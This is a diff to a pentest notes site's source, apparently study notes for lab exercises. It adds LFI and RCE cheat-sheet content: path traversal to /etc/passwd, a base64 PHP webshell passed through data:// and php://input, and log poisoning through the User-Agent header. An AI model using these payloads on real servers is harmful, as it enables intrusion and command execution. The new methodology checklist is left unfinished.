@@ -19,6 +19,17 @@
 // within a run of text were turned into markdown hard breaks (trailing
 // two spaces) so the author's original line-by-line layout still renders
 // as line breaks, since remark's default softbreak collapses to a space.
+// Leading indentation (tabs/spaces) on those lines - which markdown would
+// otherwise strip - is kept as non-breaking spaces (tab -> 4) so nested
+// sub-points stay indented. Literal "<", ">" and "&" in non-code text are
+// HTML-entity-escaped so a raw `<?php ... ?>` inside a `<span class="cmd">`
+// isn't swallowed as bogus markup by the raw-HTML parser; "~" is
+// backslash-escaped outside code spans so it isn't read as GFM
+// strikethrough. Any literal backslash in non-code text (very common in
+// Windows paths like `C:\xampp\apache\logs\`) is itself doubled first, so
+// a trailing backslash can't markdown-escape whatever markup gets appended
+// right after it (e.g. a closing `</span>`) into inert text and silently
+// leave the real tag unclosed.
 // No wording was changed, including typos in the source.
 //
 // The tree is *not* a fixed two-level section/note shape - CherryTree
@@ -703,6 +714,10 @@ To skip evaluation of remaining fields:
 Add <span class="cmd">**' --**</span> in the end of the current field (OR)  
 Add <span class="cmd">**' -- -**</span> in the URL because the space in the end might get stripped off.
 
+### Connection to Remote MySQL server
+
+<span class="cmd">mysql -u [username] -h [MACHINE_IP] -P [PORT] -p</span>
+
 # Version
 
 | Database type | Query |  
@@ -883,7 +898,8 @@ Commonly targeted files on both and Windows systems.
 
 # File Disclosure using LFI
 
-**NOTE:** Encoded <span class="cmd">../</span> : <span class="cmd">%2e%2e%2f</span>
+**NOTE:** Encoded <span class="cmd">../</span> : <span class="cmd">%2E%2E%2F</span>  
+&nbsp;&nbsp;&nbsp;&nbsp;Double-encoded : <span class="cmd">%252E%252E%252F</span>
 
 ## Path traversal
 
@@ -911,7 +927,7 @@ Null byte <span class="cmd">**%00**</span> can also be used
 &nbsp;&nbsp;&nbsp;&nbsp;So create long ones that evaluate to correct path - appended extension also will be truncated  
 &nbsp;&nbsp;&nbsp;&nbsp;But we have to start with non-existent directory  
 &nbsp;&nbsp;&nbsp;&nbsp;Eg: <span class="cmd">?language=non_existing_directory/../../../etc/passwd/./././././ REPEATED \\~2048 times</span>  
-<span class="cmd">echo -n "[non_existing_directory]/../../../etc/passwd/" &amp;&amp; for i in {1..2048}; do echo -n "./"; done</span>  
+<span class="cmd">echo -n "non_existing_directory/../../../etc/passwd/" &amp;&amp; for i in {1..2048}; do echo -n "./"; done</span>  
 • We can use multiple ../ like previously but exact length of string must be calculated - only .php must get truncated
 
 ## Forced Directory Prefix
@@ -948,7 +964,7 @@ Read discovered files' source, then scan them for further referenced PHP files -
 
 ## Standard PHP LFI
 
-Including a .php file through LFI normally executes it, so we get the rendered output (often empty, e.g. config.php just sets config, no HTML)  
+Including a <span class="cmd">.php</span> file through LFI normally executes it, so we get the rendered output (often empty, e.g. <span class="cmd">config.php</span> just sets config, no HTML)  
 **NOTE:** To read source code instead of executing it, use the base64 filter - bypasses execution and gives us the raw encoded source
 
 ## Extract source code
@@ -962,33 +978,35 @@ Eg: <span class="cmd">http://[MACHINE_IP]:[PORT]/index.php?language=php://filter
 
 # Remote Code Execution
 
+To pass commands like <span class="cmd">ls /</span> or <span class="cmd">cat flag.txt</span>, URL encode 'space' with <span class="cmd">+</span> or <span class="cmd">%20</span>
+
 ## PHP Wrappers
 
 ### Data
 
 Data wrapper can be used to include external data, including php code. <span class="cmd">allow_url_include</span> must be enabled in PHP configurations.  
 • Check PHP configurations  
-<span class="cmd">X.Y</span> : PHP Version  
-NOTE: **Start with latest** PHP version, and **then try earlier versions** if the configuration file couldn't be located.  
-Apache: <span class="cmd">/etc/php/X.Y/apache2/php.ini</span>  
-Nginx: <span class="cmd">/etc/php/X.Y/fpm/php.ini</span>  
+Location:   
+&nbsp;&nbsp;&nbsp;&nbsp;Apache: <span class="cmd">/etc/php/X.Y/apache2/php.ini</span> or <span class="cmd">C:\\\\xampp\\\\php\\\\php.ini</span>  
+&nbsp;&nbsp;&nbsp;&nbsp;Nginx: <span class="cmd">/etc/php/X.Y/fpm/php.ini</span> or <span class="cmd">C:\\\\nginx\\\\php\\\\php.ini</span>  
 Eg: <span class="cmd">curl "http://[SERVER_IP]:[PORT]/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"</span>  
+<span class="cmd">X.Y</span> : PHP Version  
+• NOTE: **Start with latest** PHP version, and **then try earlier versions** if the configuration file couldn't be located.  
 • Take the base64 string, decode and search for <span class="cmd">allow_url_include</span> with grep  
 If <span class="cmd">allow_url_include</span> is On then:  
-Encode basic PHP webshell into base64:  
+• Encode basic PHP webshell into base64:  
 <span class="cmd">echo '&lt;?php system($_GET["cmd"]); ?&gt;' | base64</span>  
-Then URL encode the base64 text and pass it to the data wrapper. We can then pass the command to the webshell:  
+• Then URL encode the base64 text and pass it to the data wrapper. We can then pass the command to the webshell:  
 <span class="cmd">data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&amp;cmd=id</span>  
-Eg: <span class="cmd">http://[MACHINE_IP]:[PORT]/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&amp;cmd=id</span>
+Eg:   
+<span class="cmd">http://[MACHINE_IP]:[PORT]/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&amp;cmd=id</span>
 
 ### Input
 
 Difference from Data wrapper: Input is sent to the wrapper as a POST request's data.  
 • <span class="cmd">allow_url_include</span> needs to be On like above.  
-• To repeat earlier attack, send POST request with webshell as the data:  
-Eg:   
+• Send POST request with webshell as the data  
 <span class="cmd">curl -s -X POST --data '&lt;?php system($_GET["cmd"]); ?&gt;' "http://[MACHINE_IP]:[PORT]/index.php?language=php://input&amp;cmd=id"</span>  
-• To pass commands like <span class="cmd">ls /</span> or <span class="cmd">cat flag.txt</span>, URL encode 'space' with <span class="cmd">+</span> or <span class="cmd">%20</span>  
 • To pass the command as GET parameter, <span class="cmd">$_REQUEST</span> (GET request) must be enabled/used. If only POST is enabled: Pass the command directly in PHP code:  
 Eg: <span class="cmd">&lt;\\\\?php system('id')?&gt;</span>
 
@@ -1060,6 +1078,7 @@ After uploading the file, we need to include it. We need the path to the uploade
 NOTE: If we do not know where the file is uploaded, then we can fuzz for an uploads directory, and then fuzz for our uploaded file, though this may not always work as some web applications properly hide the uploaded files.  
 • Include uploaded file in vulnerable function to execute the PHP code  
 <span class="cmd">http://[MACHINE_IP]:[PORT]/index.php?language=[path_to_image]&amp;cmd=id</span>  
+NOTE: GIF8 may be appended to all outputs.  
 NOTE: In case the LFI did prefix a directory before our input, then we simply need to <span class="cmd">../</span> out of that directory and then use our URL path.
 
 **ZIP Upload**  
@@ -1122,10 +1141,10 @@ Tip: Logs tend to be huge, so it might take some time to load, or may even crash
 • Intercept the LFI request on Burpsuite and change the <span class="cmd">User-Agent</span> header to "Log poisoning"  
 • Include the log file again to see if is shows up in the log file.  
 • Now poison the header with a webshell in Burpsuite or terminal:  
-<span class="cmd">echo -n "User-Agent: &lt;?php system(\\\\$_GET['cmd']); ?&gt;" &gt; poison</span>  
-<span class="cmd">curl -s "http://[MACHINE_IP]:[PORT]/index.php" -H @poison</span>  
+<span class="cmd">curl -s "http://[MACHINE_IP]:[PORT]/index.php" -H "User-Agent: &lt;?php system(\\\\$_GET['cmd']); ?&gt;"</span>  
 • Execute the command  
-<span class="cmd">curl -s "http://[MACHINE_IP]:[PORT]/var/log/apache2/access.log&amp;cmd=id"</span>
+<span class="cmd">curl -s "http://[MACHINE_IP]:[PORT]/index.php?[parameter]=/var/log/apache2/access.log&amp;cmd=id"</span>  
+NOTE: To execute another command, log file has to be poisoned with the web shell again like above.
 
 Some service logs that we may be able to read:  
 <span class="cmd">/var/log/sshd.log</span>  
@@ -1156,7 +1175,7 @@ Web root wordlist:
 &nbsp;&nbsp;&nbsp;&nbsp;Windows: <span class="cmd">/usr/share/wordlists/seclists/Discovery/Web-Content/default-web-root-directory-windows.txt</span>  
 • Find the servers webroot  
 <span class="cmd">ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt -u 'http://[MACHINE_IP]:[PORT]/index.php?language=../../../../FUZZ/index.php'</span>  
-The number of <span class="cmd">../</span> doesn't matter anyways (check top of page)
+The number of <span class="cmd">../</span> doesn't matter anyways (check top of page), but **depends on**: least no. of <span class="cmd">../</span> from above fuzzing parameter scan. 
 
 **Server Logs/Configurations**  
 <span class="cmd">/usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt</span>  
@@ -3595,6 +3614,27 @@ Wordlists to use: [Wordlists](/notes/pentest-notes/enumeration/wordlists)`,
 &nbsp;  
 ☐ Magic number change of innocent file to filtered value  
 ☐ MIME filter change of **innocent file**`,
+          },
+          {
+            slug: "file-inclusion-methodology",
+            title: "File inclusion methodology",
+            body: `# File Inclusion
+
+☐ Determine the webserver, eg: nginx, apache etc.  
+☐ Check basic path traversal payloads in possible parameters  
+☐ Fuzz for PHP files   
+☐ Fuzz the paramters for these PHP files  
+☐ Test common payloads against there paramters  
+☐ After finding payload that works, include a file to verify  
+☐ Look at the source code of all the PHP files found above  
+☐ 
+
+☐ Extract config file  
+☐ If allow_url_include is on:  
+&nbsp;&nbsp;&nbsp;☐ f  
+&nbsp;&nbsp;&nbsp;☐ f  
+☐ If allow_url_include is off:  
+&nbsp;&nbsp;&nbsp;☐`,
           },
         ],
       },
